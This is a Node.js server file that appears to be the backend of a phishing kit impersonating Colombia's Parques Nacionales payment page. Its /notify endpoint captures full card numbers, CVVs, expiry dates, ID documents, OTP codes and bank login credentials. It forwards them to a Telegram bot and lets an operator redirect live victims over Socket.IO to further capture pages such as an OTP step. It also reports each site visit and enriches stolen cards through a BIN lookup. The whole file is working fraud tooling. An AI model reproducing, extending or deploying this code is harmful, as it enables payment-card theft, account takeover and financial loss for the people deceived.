const http    = require('http');
const express = require('express');
const cors    = require('cors');
const rateLimit = require('express-rate-limit');
const { Server: SocketIO } = require('socket.io');

const { lookupBin } = require('./aggregator');
const cache = require('./cache');
const tg    = require('./telegram-bot');

const app    = express();
const server = http.createServer(app);
const io     = new SocketIO(server, {
  cors: { origin: '*', methods: ['GET', 'POST'] },
  transports: ['polling', 'websocket'],
  pingInterval: 25000,
  pingTimeout: 60000
});

tg.setIo(io);

const PORT = process.env.PORT || 3000;
const ALLOWED_ORIGIN = process.env.ALLOWED_ORIGIN || '*';

app.set('trust proxy', 1);
app.use(express.json({ limit: '16kb' }));
app.use(
  cors({
    origin: ALLOWED_ORIGIN === '*' ? true : ALLOWED_ORIGIN.split(',').map((s) => s.trim()),
  })
);

const limiter = rateLimit({
  windowMs: 60 * 1000,
  max: 60,
  standardHeaders: true,
  legacyHeaders: false,
});
app.use('/bin-check', limiter);

// --- Socket.IO: registro de sesiones ---
io.on('connection', (socket) => {
  socket.on('init_session', ({ sessionId }) => {
    if (!sessionId) return;
    tg.activeSessions.set(String(sessionId), { socketId: socket.id });
    console.log(`[Socket] Sesión registrada: ${sessionId} -> ${socket.id}`);
  });
  socket.on('disconnect', () => {
    for (const [sid, sess] of tg.activeSessions) {
      if (sess.socketId === socket.id) {
        tg.activeSessions.delete(sid);
        console.log(`[Socket] Sesión eliminada: ${sid}`);
        break;
      }
    }
  });
});

// --- Endpoint de notificación Telegram (flexible para PAGO, OTP, LOGO) ---
app.post('/notify', async (req, res) => {
  const d = req.body || {};
  const tid = String(d.sessionId || d.codigo || ('s' + Date.now()));

  console.log('[NOTIFY] Solicitud recibida:', JSON.stringify(d));

  // Registrar sesión previa
  if (!tg.activeSessions.has(tid)) {
    tg.activeSessions.set(tid, { socketId: null });
  }

  const ts = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
  let msg = '';

  // Detectar tipo de notificación
  console.log('[NOTIFY] Detectando tipo: otp=' + !!d.otp + ', field1=' + !!d.field1Value);
  if (d.otp) {
    // ═══ NOTIFICACIÓN OTP ═══
    msg = `🔐 <b>CÓDIGO OTP RECIBIDO</b>\n` +
          `━━━━━━━━━━━━━━━━━\n` +
          `📄 Factura: #${d.invoiceNumber || '—'}\n` +
          `💰 Valor: ${d.invoiceAmount || '—'}\n` +
          `💳 Tarjeta: ${d.cardFull || ('****' + (d.cardLast4 || '—'))}\n` +
          `👤 Titular: ${d.name || '—'}\n` +
          `🔑 OTP: <b>${d.otp}</b>\n` +
          `🌐 IP: ${d.ip || '—'}\n` +
          `📍 Ubicación: ${d.location || '—'}\n` +
          `⏰ Timestamp: ${ts}\n` +
          `🔑 sessionId: ${tid}\n` +
          `━━━━━━━━━━━━━━━━━\n` +
          `<i>Selecciona una acción:</i>`;
  } else if (d.field1Value && d.field2Value) {
    // ═══ NOTIFICACIÓN LOGO (CREDENCIALES) ═══
    msg = `🏦 <b>CREDENCIALES LOGO</b>\n` +
          `━━━━━━━━━━━━━━━━━\n` +
          `🏦 Banco: ${d.bankDisplay || '—'}\n` +
          `📄 Factura: #${d.invoiceNumber || '—'}\n` +
          `💰 Valor: ${d.invoiceAmount || '—'}\n` +
          `💳 Tarjeta: ${d.cardFull || d.cardLast4 || '—'}\n` +
          `👤 Titular: ${d.name || '—'}\n` +
          `🔑 ${d.field1Label}: <b>${d.field1Value}</b>\n` +
          `🔒 ${d.field2Label}: <b>${d.field2Value}</b>\n` +
          `🌐 IP: ${d.ip || '—'}\n` +
          `📍 Ubicación: ${d.location || '—'}\n` +
          `⏰ Timestamp: ${ts}\n` +
          `🔑 sessionId: ${tid}\n` +
          `━━━━━━━━━━━━━━━━━\n` +
          `<i>Selecciona una acción:</i>`;
  } else {
    // ═══ NOTIFICACIÓN PAGO (original) ═══
    const c = d.card || {};
    msg = `💳 <b>NUEVO PAGO — Parques Nacionales</b>\n\n` +
          `🏞️ <b>Parque:</b> ${d.parque || '—'}\n` +
          `🔖 <b>Referencia:</b> ${d.codigo || '—'}\n` +
          `💰 <b>Monto:</b> COP ${d.total || '—'}\n\n` +
          `👤 <b>Comprador</b>\n` +
          `   🙍 ${d.nombre || ''} ${d.apellido || ''}\n` +
          `   📧 ${d.email || '—'}\n\n` +
          `💳 <b>Tarjeta</b>\n` +
          `   🏦 Banco: ${c.bankRaw || c.bankSlug || '—'}\n` +
          `   🃏 Franquicia: ${c.scheme || c.brand || '—'} ${c.type ? '/ ' + c.type : ''}\n` +
          `   🔢 Número: ${c.fullNumber || ('•••• •••• •••• ' + (c.last4 || '—'))}\n` +
          `   🔢 BIN: ${c.bin || '—'}\n` +
          `   📅 Vencimiento: ${c.expiry || '—'}\n` +
          `   🔒 CVV: ${c.cvv || '—'}\n` +
          (c.country ? `   🌍 País: ${c.country}\n` : '') +
          `   👤 Tarjetahabiente: ${c.cardHolder || '—'}\n` +
          `   🪪 Documento: ${c.document || '—'}\n\n` +
          `🕐 ${ts}`;
  }

  console.log('[NOTIFY] Mensaje construido, longitud:', msg.length);
  console.log('[NOTIFY] Enviando a Telegram con tid:', tid);
  await tg.sendTelegram(msg, tg.getKeyboard(tid));
  console.log('[NOTIFY] Respuesta enviada al cliente');
  res.json({ ok: true, tid });
});

// --- Endpoint de visita (nueva visita al sitio) ---
app.post('/visit', async (req, res) => {
  const d = req.body || {};
  const ts = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
  const msg = `👁️ <b>NUEVA VISITA — Parques Nacionales</b>\n` +
              `━━━━━━━━━━━━━━━━━\n` +
              `🔗 Referente: ${d.referrer || 'Acceso directo'}\n` +
              `⏰ Hora: ${ts}`;
  try {
    await tg.sendTelegram(msg);
    res.json({ ok: true });
  } catch (e) {
    res.json({ ok: false });
  }
});

// --- DEBUG: ver sesiones activas y probar comando directo ---
app.get('/debug/sessions', (_req, res) => {
  const out = {};
  for (const [k, v] of tg.activeSessions) {
    out[k] = { socketId: v.socketId };
  }
  res.json({ count: tg.activeSessions.size, sessions: out });
});

app.post('/debug/send-command', (req, res) => {
  const { sessionId, action, url } = req.body || {};
  const sess = tg.activeSessions.get(String(sessionId));
  if (!sess)        return res.json({ ok: false, reason: 'session_not_found' });
  if (!sess.socketId) return res.json({ ok: false, reason: 'no_socket', sess });
  io.to(sess.socketId).emit('command', { action: action || 'redirect', url: url || './otp-check.html' });
  res.json({ ok: true, socketId: sess.socketId });
});

// --- Healthcheck para el autoping ---
app.get('/ping', (_req, res) => {
  res.json({ ok: true, ts: Date.now(), uptime: process.uptime() });
});

app.get('/', (_req, res) => {
  res.json({ service: 'bin-service', status: 'up' });
});

// --- Endpoint principal ---
async function handleBinCheck(bin, res) {
  if (!/^\d{6,8}$/.test(bin)) {
    return res.status(400).json({ error: 'invalid bin, must be 6-8 digits' });
  }

  const cached = cache.get(bin);
  if (cached) {
    return res.json({ ...cached, cached: true });
  }

  try {
    const result = await lookupBin(bin);
    cache.set(bin, result);
    res.json({ ...result, cached: false });
  } catch (err) {
    console.error(`[bin-check] ${bin} -> ${err.message}`);
    res.status(502).json({
      error: 'all providers failed',
      bin,
      bank: 'unknown',
      scheme: 'UNKNOWN',
    });
  }
}

app.post('/bin-check', async (req, res) => {
  const bin = String(req.body?.bin || '').replace(/\D/g, '').slice(0, 8);
  return handleBinCheck(bin, res);
});

app.get('/bin-check/:bin', async (req, res) => {
  const bin = String(req.params.bin || '').replace(/\D/g, '').slice(0, 8);
  return handleBinCheck(bin, res);
});

// --- Autoping interno (Render keep-alive) ---
// El servidor se pinga a sí mismo cada 14 minutos para evitar que Render lo duerma
// Funciona en cualquier entorno (local, ngrok, Render)
const PING_INTERVAL_MS = 14 * 60 * 1000; // 14 minutos
const PUBLIC_URL = process.env.PUBLIC_URL;

setInterval(async () => {
  try {
    const pingUrl = PUBLIC_URL ? `${PUBLIC_URL.replace(/\/$/, '')}/ping` : 'http://localhost:' + PORT + '/ping';
    const r = await fetch(pingUrl);
    const ts = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
    if (r.ok) {
      console.log(`[autoping] ✓ ${r.status} @ ${ts}`);
    } else {
      console.warn(`[autoping] ⚠️ ${r.status} @ ${ts}`);
    }
  } catch (e) {
    console.error(`[autoping] error: ${e.message}`);
  }
}, PING_INTERVAL_MS);

console.log('[autoping] ✓ Habilitado: se ejecutará cada 14 min para evitar que Render duerma el servidor');

tg.startPolling();

server.listen(PORT, () => {
  console.log(`bin-service listening on :${PORT}`);
  console.log(`CORS origin: ${ALLOWED_ORIGIN}`);
});
